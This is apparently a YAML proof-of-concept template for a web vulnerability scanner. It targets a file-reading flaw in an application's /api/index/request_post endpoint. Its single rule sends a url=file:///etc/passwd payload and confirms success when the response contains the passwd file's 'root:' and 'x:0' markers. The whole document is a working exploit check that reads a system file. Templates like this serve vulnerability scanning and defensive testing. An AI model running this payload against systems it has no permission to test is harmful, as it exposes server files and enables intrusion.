name: poc-yaml-IOS-request_post-File-reading
transport: http


rules:
  r0:
    request:
      method: GET
      path: /api/index/request_post?url=file:///etc/passwd&post_data=1
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    expression: response.status == 200 && response.body.bcontains(b'root:') && response.body.bcontains(b'x:0')
expression: r0()

